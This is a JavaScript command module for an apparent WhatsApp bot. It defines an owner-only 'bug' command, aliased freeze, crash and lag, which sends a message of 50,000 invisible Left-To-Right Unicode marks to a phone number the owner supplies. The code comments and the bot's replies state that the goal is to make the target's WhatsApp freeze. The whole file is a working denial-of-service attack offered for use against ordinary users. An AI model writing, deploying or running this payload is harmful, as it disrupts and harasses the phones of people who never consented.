const settings = require('../../settings');
const logger = require('../../lib/logger');

module.exports = {
    name: 'bug',
    aliases: ['freeze', 'crash', 'lag'],
    category: 'owner',
    description: 'Send an invisible message that freezes the target WhatsApp',
    usage: '.bug <number>',
    ownerOnly: true,
    react: '💣',

    async execute(conn, mek, args, chatId, isOwner) {
        if (!isOwner) return;

        const targetNum = (args[0] || '').replace(/[^0-9]/g, '');
        if (!targetNum || targetNum.length < 10) {
            return conn.sendMessage(chatId, { text: `❌ Provide a valid number. Example: ${settings.prefix}bug 254712345678` }, { quoted: mek });
        }

        const jid = targetNum + '@s.whatsapp.net';
        await conn.sendMessage(chatId, { text: `💣 *Deploying Bug to +${targetNum}...*` }, { quoted: mek });

        try {
            // The "Freeze" payload: A massive string of invisible Unicode Left-To-Right marks
            // When WhatsApp renders this, it has to calculate the layout for 50,000 invisible characters
            const invisible = '\u200E';
            const payload = invisible.repeat(50000); 

            // Send the payload
            await conn.sendMessage(jid, { text: payload });
            
            await conn.sendMessage(chatId, { text: `✅ *Bug Deployed!*\n\nThe target's WhatsApp should freeze for a few seconds when they open the chat.` }, { quoted: mek });
            
        } catch (error) {
            logger.error(`[BUG] Error: ${error.message}`);
            await conn.sendMessage(chatId, { text: `❌ Failed to deploy bug: ${error.message}` }, { quoted: mek });
        }
    }
};